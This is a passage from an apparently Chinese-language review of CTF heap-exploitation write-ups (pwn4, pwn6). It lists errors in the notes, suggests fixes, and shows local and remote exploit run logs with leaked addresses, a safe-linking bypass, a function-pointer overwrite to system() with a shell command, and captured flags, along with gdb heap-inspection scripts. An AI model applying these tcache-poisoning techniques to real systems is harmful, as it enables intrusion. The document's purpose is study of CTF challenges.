(gdb) x/2gx  P
0x…480: 0x0005555b7f9480…  0xb20b623792d1e316
#        └ next = P ^ (P>>12)：用「洩漏出來的值」反推就能還原 P
```

---

## 3. 與 `wp/00` 與 `wp/99` 的一致性

### S1【高】`wp/00` 完全沒有 heap 內容，兩份筆記也都沒引用 `wp/99` §8

* `wp/00_基礎知識_從零開始.md` 的目錄（`:13-29`）只有 ELF/保護/組語/stack/syscall/PLT-GOT/ROP/SROP/
  pwntools/gdb/SOP ——**沒有任何 heap、chunk、bin、tcache、safe-linking 章節**；
  §9 只把「Heap Overflow / UAF」列成一列表格名詞（`:439`）。
* 讀者在 00 第 6 行的建議閱讀順序裡被要求「讀完 00 就能看懂每一題的 notes」，
  但實際上 `pwn4`/`pwn6` 需要的 heap 知識只在 `wp/99` §8（迷你版）與 `pwn4` §5（完整版）。
* `grep -n "wp/99\|速查表" pwn4/notes.md pwn6/notes.md` → **0 筆**。
* **建議**：`wp/00` §9 或 §15 加一行「heap 題（pwn4/pwn6）請先讀 `wp/99 §8` + `pwn4/notes.md §5`」；
  兩份 notes 開頭各加一行互相指路。

### S2【高】`wp/00` 對 pwn6 的三處描述與 pwn6 筆記矛盾

| 位置 | `wp/00` 原文 | pwn6 筆記／實況 |
|---|---|---|
| `wp/00:886` | `code_breaker \| … \| PIE + canary → ROP` | `pwn6/notes.md:24`：「**完全不需要 ROP chain**」；§4 是函式指標覆寫（`call [0x40c0]`），實跑也完全沒用到 gadget |
| `wp/00:439` | Heap Overflow / UAF → 只列 `pwn4（heap 題）` | pwn6 也是 heap 題（UAF + double free + tcache poisoning，`pwn6/notes.md:17-19`） |
| `wp/00:442` | Uninitialised memory → `pwn6` | `pwn6/notes.md:1041-1044`（坑 5）明確寫「這是**檢查過但不存在**的候選漏洞」 |

**建議**：把 `wp/00:886` 改成「PIE + canary → heap UAF/double-free → 覆寫函式指標（不需 ROP）」，
`:439` 補上 pwn6，`:442` 的 pwn6 改成「（候選，已排除）」或刪掉。

### S3【中】`wp/99` §8 對 safe-linking 的說法與 pwn4 §5.4 的重點衝突

* `wp/99:184-185`：「safe-linking … tcache 的 `fd` 存的是 `ptr ^ (chunk_addr >> 12)`，
  **所以偽造 `fd` 前要先知道 chunk 位址**」。
* `pwn4/notes.md:686-702` 的重點正好相反：**只需要 `chunk>>12`（高位 36 bits），不需要完整位址**——
  這才是「safe-linking 擋不住」的原因，也是這題 flag 的意義。
* **建議** `wp/99` 改成：「…存的是 `target ^ (chunk_addr >> 12)`；因為只用到 `chunk>>12`，
  只要**洩漏 `chunk>>12`**（例如 free 到空鏈時讀出 `next`）就能偽造 `fd`，見 `pwn4/notes.md` §5.4」。

### S4【中】`wp/99` §8 少了三個「現代 glibc 一定要知道」的細節

`pwn4` §5.4/§10 與 `pwn6` 坑 7/8 都依賴、但 `wp/99` §8 沒寫：

1. `tcache->entries[]` 存的是**明文 user 位址**（不用解碼），只有 chunk 內的 `next` 才編碼；
2. `tcache_get()` 有 `aligned_OK(e)` 檢查 → 毒化目標必須 **16-byte 對齊**；
3. `tcache_put` 寫入順序 `key → next → entries → counts`（順序影響「怎麼清檢查」）。

**建議**：在 `wp/99` §8 的 bullet 清單補這三點（各一行）。

### S5【低】RELRO 描述不一致（= E7）

`wp/00` §4.4 說 Partial RELRO → `.got` 唯讀、`.got.plt` 可寫；
`pwn4/notes.md:70,82` 說「只有 `.init_array`/`.fini_array` 被保護」。
以 `readelf` 為準：RELRO 覆蓋 `0x403dc0~0x404000`（含 `.got`）。

### S6【低】暫存器表術語不一致（= E13）

`pwn4:109`「r8~r11 第 5、6 個參數」 vs `wp/00` §6.1 / `pwn6:93`「r8、r9 是第 5、6 個參數」。

### S7【低】同一格欄位有三個名字，建議在 `wp/99` 明說

`wp/99` §8 用 `fd`/`bk`（unsorted 語意），`pwn4` §5.1 用 `next`/`key`（tcache 語意），
`pwn6` 用 `next`/`key`。三處其實都對（同一格在不同 bin 有不同名字），但新手會以為衝突。
建議 `wp/99` §8 補一句：「`+0x10`/`+0x18` 這兩格：在 tcache 叫 `next`/`key`，
在 unsorted/small/large bin 叫 `fd`/`bk`；fastbin 只用到 `+0x10` 的 `fd`。」

---

## 4. 實測結果

環境：Arch Linux、`python3` + pwntools（無 pwndbg，gdb 為純 gdb + python 讀記憶體）。
四支指令都在題目目錄下執行。**四項全部 PASS。**

### 4.1 `pwn4` local — PASS

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn4 && python3 exploit.py
```

```
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2': pid 3531201
[+] unsorted bin head : 0x7f2185203b20
[+] libc base         : 0x7f2185000000
[+] safe-linking key  : 0x55555d976
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7f2185058740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{LOCAL_TEST_FLAG}
total 2484
drwxr-xr-x  3 kzzz kzzz    4096 Sep 28 00:40 .
drwxr-xr-x 10 kzzz kzzz    4096 Sep 28 00:14 ..
-rwxr-xr-x  1 kzzz kzzz   14592 Sep 28 00:08 cache_money
... (略)
-rw-------  1 kzzz kzzz   52451 Sep 28 00:39 notes.md
drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 00:39 work
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_TEST_FLAG}
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2' (pid 3531201)
```

* 與 `notes.md` §9.1 對照：5 行 log 值與 `uid=` 行**完全一致**（`0x7f2185203b20 - 0x7f2185000000 = 0x203b20` ✔、
  `system - libc = 0x58740` ✔）；差異只有 E12 提到的「少貼了 `Deposited 8 bytes` + MENU echo」。
* flag = `pwn4/flag.txt` 的 `sun{LOCAL_TEST_FLAG}` ✔（`FLAG.txt` 沒被覆蓋 ✔）。

### 4.2 `pwn4` REMOTE — PASS

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn4 && python3 exploit.py REMOTE
```

```
[x] Opening connection to chal.sunshinectf.games on port 26004
[x] Opening connection to chal.sunshinectf.games on port 26004: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26004: Done
[+] unsorted bin head : 0x7579e40b9b20
[+] libc base         : 0x7579e3eb6000
[+] safe-linking key  : 0x14a3d
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7579e3f0e740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
...
>>> sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
total 12
drwxr-xr-x 2 root root        4096 Sep 26 00:21 .
drwxr-xr-x 1 root root        4096 Sep 26 00:54 ..
-rw-r----- 1 root cache_money   40 Sep 26 00:13 flag.txt
uid=1337(cache_money) gid=1337(cache_money) groups=1337(cache_money)
DONE

FLAG: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
[*] Closed connection to chal.sunshinectf.games port 26004
```

* 與 §9.2 逐行一致 ✔；`unsorted - libc = 0x203b20` ✔、`system - libc = 0x58740` ✔，
  GOT 指紋「all GOT entries match」代表 11 個 offset 在遠端 libc 全部命中（`OFF_SYSTEM`/`OFF_UNSORTED` **不是寫死硬猜**）。
* 遠端 flag 與 `pwn4/FLAG.txt` 相同 ✔。

### 4.3 `pwn6` local — PASS

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn6 && python3 exploit.py
```

```
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2': pid 3531204
[+] handshake ok, key schedule = b5124d80f24e952f82ce7874fcdcaded
[+] PIE base = 0x7fb9ea5f5000
[*] target function pointer @ 0x7fb9ea5f90c0  ->  system@plt 0x7fb9ea5f6150
[+] heap leak: stored_next=0x555021b54aa0 tcache_key=0x612209b5a3eec7b9
[+] victim chunk P = 0x555574e20480
[+] wrote system@plt into <0x7fb9ea5f90c0>
[+] verified: [0x7fb9ea5f90c0] == 0x7fb9ea5f6150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{local_test_flag}
total 2520
... (略)
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE
 HG…TK…l…fJ…PZ…?…X2…^…;…$… …W…g y…%~ev ^…\9J…$…N B…      ← 尾端加密流 echo（筆記未貼，見 E12）
FLAG: sun{local_test_flag}
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2' (pid 3531204)
```

* 與 §8.1 對照：log 行格式一致；`PIE base + 0x1150 = system@plt` ✔、`+0x40c0 = 目標` ✔、
  `stored_next == P ^ (P>>12)`（我用 python 複算過：`0x555574e20480 ^ (0x555574e20480>>12) = 0x555021b54aa0` ✔）。
* flag = `pwn6/flag.txt` 的 `sun{local_test_flag}` ✔。

### 4.4 `pwn6` REMOTE — PASS

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn6 && python3 exploit.py REMOTE | tr -d '\000'
```

```
[x] Opening connection to chal.sunshinectf.games on port 26005
[x] Opening connection to chal.sunshinectf.games on port 26005: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26005: Done
[+] handshake ok, key schedule = 07818e0ee26c40724bf061acfbf30673
[+] PIE base = 0x61ba1551a000
[*] target function pointer @ 0x61ba1551e0c0  ->  system@plt 0x61ba1551b150
[+] heap leak: stored_next=0x61bc01e690f3 tcache_key=0x4ae70434c05b2c17
[+] victim chunk P = 0x61ba1a473480
[+] wrote system@plt into <0x61ba1551e0c0>
[+] verified: [0x61ba1551e0c0] == 0x61ba1551b150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
total 12
drwxr-xr-x 2 root root        4096 Sep 26 00:21 .
drwxr-xr-x 1 root root        4096 Sep 26 00:54 ..
-rw-r----- 1 root code_breaker  36 Sep 26 00:13 flag.txt
uid=1337(code_breaker) gid=1337(code_breaker) groups=1337(code_breaker)
DONE
 H7~-|'…-….Z…8Q…g…{A…4…j… …q…L…_{… …-K…s…V…pA\WE     ← 同上，加密流 echo
FLAG: sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
[*] Closed connection to chal.sunshinectf.games port 26005
```

* 與 §8.2 逐行一致 ✔，`stored_next == P ^ (P>>12)` ✔（python 複算通過）。
* 遠端 flag 與 `pwn6/FLAG.txt` 相同 ✔。

### 4.5 四項總結

| 測試 | 指令 | 結果 | flag |
|---|---|---|---|
| pwn4 local | `python3 exploit.py` | **PASS** | `sun{LOCAL_TEST_FLAG}` |
| pwn4 REMOTE | `python3 exploit.py REMOTE` | **PASS** | `sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}` |
| pwn6 local | `python3 exploit.py` | **PASS** | `sun{local_test_flag}` |
| pwn6 REMOTE | `python3 exploit.py REMOTE` | **PASS** | `sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}` |

### 附錄 A：本輪對 `pwn4` heap 佈局的 gdb 複驗（可重現）

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn4
printf '1\nS\n128\n' > /tmp/p4in.bin; printf '1\nD\n128\n' >> /tmp/p4in.bin
for i in 0 1 2 3 4 5 6; do printf "1\nW$i\n128\n" >> /tmp/p4in.bin; done
for i in 2 3 4 5 6 7 8; do printf "5\n$i\n"     >> /tmp/p4in.bin; done
printf '4\n0\n1\n' >> /tmp/p4in.bin

# cm_dbg = patchelf 過的副本，interpreter 指向本地 ld-linux-x86-64.so.2（= 題目附的 2.39）
cat > /tmp/p4.gdb <<'EOF'
set pagination off
set confirm off
b *0x401ae8
run < /tmp/p4in.bin
printf "FREED_LEDGER(rax)=%p  SRC_WALLET(rbx)=%p  DST_WALLET(rbp)=%p\n", $rax,$rbx,$rbp
python
import gdb
inf = gdb.selected_inferior()
def rq(a): return int.from_bytes(inf.read_memory(a,8),'little')
out = gdb.execute('info proc mappings', to_string=True)
heap=None; libcs=[]; heapsz=0
for l in out.splitlines():
    p=l.split()
    if len(p)<5: continue
    try: st=int(p[0],16)
    except: continue
    if '[heap]' in l: heap, heapsz = st, int(p[2],16)
    if 'libc.so.6' in l: libcs.append(st)
print('HEAP=%#x  LIBC_BASE=%#x  main_arena=%#x'%(heap,min(libcs),min(libcs)+0x203ac0))
print('--- tcache_perthread chunk header / counts / entries:')
gdb.execute('x/2gx %d'%heap); gdb.execute('x/16hx %d'%(heap+0x10)); gdb.execute('x/16gx %d'%(heap+0x90))
print('--- chunk walk (size & ~0xf):')
a=heap
while a < heap+heapsz-0x10:
    sz=rq(a+8) & ~0xf
    if sz==0: break
    print('  %#-10x size=%#x'%(a, rq(a+8))); a+=sz
print('  top at %#x'%a)
print('--- freed ledger / dst wallet chunk headers:')
gdb.execute('x/2gx $rax-0x10'); gdb.execute('x/2gx $rbp-0x10'); gdb.execute('x/6gx $rax-0x10')
end
EOF
gdb -q -batch -x /tmp/p4.gdb ./cm_dbg
```

實測輸出（節錄，與 `notes.md` §6 的表**完全一致**）：

```
FREED_LEDGER(rax)=0x4062f0  SRC_WALLET(rbx)=0x4062b0  DST_WALLET(rbp)=0x406380
HEAP=0x405000  LIBC_BASE=0x7ffff7c00000  main_arena=0x7ffff7e03ac0
0x405000: 0x0000000000000000  0x0000000000000291      ← tcache_perthread_struct，size 0x291 ✔
0x405010: 0x0000 0x0000 0x0007 … 0x0007               ← counts[2]=7、counts[7]=7 ✔
0x4050a0: 0x406930   0x4050c8: 0x406970               ← entries 存「user 位址」(E2)
0x4062e0: 0x0000000000000000  0x0000000000000091      ← S ledger chunk ✔
0x4062f0: 0x00007ffff7e03b20  0x00007ffff7e03b20      ← fd=bk=libc+0x203b20（main_arena+0x60）✔
0x406370: 0x0000000000000090  0x0000000000000040      ← D wallet chunk：P bit 被清掉 ✔
  chunk walk: 0x405000 0x291 | 0x405290 0x1011 | 0x4062a0 0x41 | 0x4062e0 0x91 | 0x406370 0x40 |
              0x4063b0 0x91 | 0x406440 0x41 | 0x406480 0x91 | … | 0x406920 0x41 | 0x406960 0x91 |
              0x4069f0 size=0x1f611（= top chunk；走訪在 heap 尾端 0x426000 停止）
```

> `0x405290` 的 `0x1011` 就是 `notes.md` §6 說的「stdio 的 0x1000 buffer」✔；
> `main_arena` 位址 = `libc + 0x203ac0`（我用 gdb 的 mappings 反推：`libc=0x7ffff7c00000`、
> `fd=0x7ffff7e03b20` ⇒ `0x203b20 = 0x203ac0 + 0x60` ✔ 與 §5.5 的說法一致）。

### 附錄 B：本輪對 safe-linking 的 gdb 複驗（可重現）

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn4
printf '1\nA\n32\n1\nB\n32\n4\n0\n1\n' > /tmp/p4c.bin   # 兩個 0x20 wallet → transfer 把 0x30 chunk free 到「空」tcache[0x30]
cat > /tmp/p4c.gdb <<'EOF'
set pagination off
set confirm off
b *0x401ae8
run < /tmp/p4c.bin
python
import gdb
inf = gdb.selected_inferior()
rax = int(gdb.parse_and_eval('$rax'))          # free 掉的 chunk 的「user 位址」(rax = src->ledger)
stored = int.from_bytes(inf.read_memory(rax, 8), 'little')      # chunk->next
keyf   = int.from_bytes(inf.read_memory(rax+8, 8), 'little')    # chunk->key
print('freed user ptr = %#x' % rax)
print('chunk>>12       = %#x' % (rax >> 12))
print('stored next     = %#x' % stored, '(MATCH)' if stored == (rax>>12) else '(MISMATCH)')
print('key field       = %#x' % keyf)
end
EOF
gdb -q -batch -x /tmp/p4c.gdb ./cm_dbg
```

```
freed user ptr = 0x4062f0
chunk>>12       = 0x406
stored next     = 0x406 (MATCH)         ← 空鏈 ⇒ next = (chunk >> 12)  ★ 這就是「key」
key field       = 0xb20b623792d1e316    ← 隨機 tcache_key（每次執行都不同；不是指標，2.34+）
```

⇒ `pwn4` §5.4「空鏈時 `stored = chunk>>12`」與 `pwn6` §4.3 的自我參照式，**經 gdb 實證成立**。

### 附錄 C：本輪逐條比對指令位址的結果

我寫了一支腳本，把兩份筆記裡**每一行以 16 進位位址開頭的組語**抓出來，
跟 `objdump` 在該位址的真實指令逐字比對。結果：

* `pwn6/notes.md`：43 條引用中，**只有 2 條**是我腳本的正規化誤判
  （`:191` 那行把 bytes 與 mnemonic 混寫但解碼正確；`:713` 用 `call QWORD PTR [0x40c0]`
  這個簡寫代替 `call QWORD PTR [rip+0x2682] # 40c0`，語意相同）⇒ **pwn6 的組語引用全部正確**。
* `pwn4/notes.md`：167 條引用中，扣掉我腳本的正規化誤判（`call fgets@plt` vs `call 401170 <fgets@plt>`
  這類）與刻意用 C 語法改寫的註解行（`printf("...")`、`fgets(rsp,0x20,stdin)`）後，
  仍有 **20 處以上真實的位址／運算元錯誤**，全部集中在 §3.4 與 §4.2~§4.6，列在 §1 的 E3~E6/E8/E14
  （代表：`:294 401535→401536`、`:297 40153d→40153b/40153d`、`:304/309/310/311/313` 的 `read_int` 尾段、
  `:323/325/327/335` 的 `Open Wallet` 序言、`:339/340` 的 `calloc`、`:350/352/357/420/450/472` 的單點位移、
  `:404/444` 的 `push rbx`（實為 `endbr64`）、`:481/483/484` 的 `Transfer` 序言）。
* 另外 `pwn4` §4.1（main / 跳表）、§4.6（Transfer 尾段 `401ac9/401acd/401ae8/401af0/401af8/401b0a/401b12`）、
  §3.4（GOT 清單）、§4.7（Close）**逐條正確**；
  `pwn6` §2.8（keystream 迴圈 `19a8`~`19ca`）、§2.9（key schedule）、§2.10（slot 結構）、
  §4.1/§4.2（clone/free）、§6.2（.bss 圖）、§6.3（heap 圖）**逐條正確**。

---

## 5. 評分與 3 個最有價值的改進

### 分數：**7 / 10**

（標準與 Round 1 一致：**「完全沒學過 heap / ROP 的人，能不能只靠這兩份文件學會這個手法並重現」**。）

**加分項**

* 兩支 exploit **local + REMOTE 全 PASS**，而且遠端 libc 指紋比對、`assert` 檢查、
  「不 clobber 真 flag」的保護都做得很紮實（`pwn4/exploit.py:220`、`pwn6/exploit.py:255`），實戰可用性高。
* 本輪逐項複驗後，**所有關鍵技術主張全部成立**：`Transfer` 的 free-後-存-已釋放指標
  (`0x401acd` free / `0x401ae8` 存)、wallet 結構 offset、slot 表 `0x4040c0`、`strtol@got=0x404040`、
  `main_arena` offset `0x203b20`、7 次 Close 填滿 tcache、safe-linking key 推導、
  `cmd 0x14` 的 `1e5e` refcount bug、`cmd 0x13` 的 free、`0x40c0`/`PIE+0x1390`、
  `rdi=buf; call [0x40c0]`、big-endian 長度、`p16(x,'big')` 不是 endian（我實測 `p16(1,'big')==b'\x01\x00'` 確認）、
  `sys.argv` 被 pwntools 偷走 —— 通通對。
* `pwn4` §6 的 gdb 佈局表與 §5 的 heap 理論骨架**與實測完全一致**（附錄 A），
  而且教學順序 chunk → bin → tcache → safe-linking → poisoning 是對的。
* `pwn6` §2 的逐行組語與 §6 的 `.bss`/stack frame 圖**精確到 byte**（連 saved r15/r14/…/rbx 的位置、
  canary `rsp+0x3038`、return address `0x124a` 都對）。

**扣分項（就是下面三件事）**

* `pwn4` §4 的組語區塊是**手打**的，有 20 處以上位址/運算元錯誤（含 `read_int` 的語意錯誤與 `calloc` 參數對調），
  違背了檔頭「所有位址都是我實際看到的」的承諾。
* `pwn4` §5 有 3 個理論錯誤（fastbin 7、entries 指標型別、small bin 範圍）。
* `pwn6` 對「沒學過 heap」的讀者**沒有入口**：名詞直接用、沒有圖、沒有指路，也沒有 gdb 證據；
  且 `P` 的定義會讓人算錯 0x10。

### 3 個最有價值的改進

1. **`pwn6` 補上 heap 入口（15~20 行）+ 修正 `P` 的定義。**
   在 §4 前加「chunk / bin / tcache / safe-linking 最小語彙」（或明確指到 `wp/99 §8`、`pwn4 §5`），
   並把 `P` 明確定義為「`malloc` 回傳的 user 位址，chunk 標頭 = `P-0x10`」，
   再補一段 gdb 的 `P→P` 環 dump（附錄 B 可直接改寫）。這是唯一會讓新手**做不出來**的缺口。

2. **`pwn4` 的組語全部改成「objdump 貼上」＋修掉 3 個理論錯誤。**
   把 §4.2/§4.3/§4.4/§4.5/§4.6 的區塊用 `objdump -d -M intel --start-address=… --stop-address=…`
   直接貼（`dis.txt` 已經是正確版），並修正：
   `fastbin 沒有 7 上限`、`entries[] = malloc 回傳的明文位址`、`small bin ≤ 0x3f0`。
   同時把「EOF → 回 -1」改成「EOF → `exit(0)`」。

3. **補 3 張圖 + 貼真實 transcript。**
   (a) `pwn4` 的 tcache 三態圖（空鏈→環→毒化後 `P → 0x4040c0`）；
   (b) `pwn4` 的 fake wallet / slots 疊圖（`fake+0x18=&slots[0]`、`+0x20=&slots[1]`、`+0x28=&slots[2]`）
   與 `POISON_SLOT=6` 的 slot 掃描推導；
   (c) `pwn6` 的 `P` 三態圖。並把 §4 的實跑輸出（含 `pwn6` 尾端的二進位 echo、`pwn4` 的
   `Deposited`/MENU 行）貼回文件，避免新手以為自己跑壞了。

---

> 本檔只做審查，**沒有修改任何其他檔案**（`pwn4/notes.md`、`pwn4/exploit.py`、`pwn6/notes.md`、
> `pwn6/exploit.py`、`wp/00`、`wp/99` 皆未變動）。實跑產生的 `/tmp` 檔案與
> `pwn4/FLAG.txt`/`pwn6/FLAG.txt`（內容與原值相同，因為遠端 flag 一樣）不影響內容。
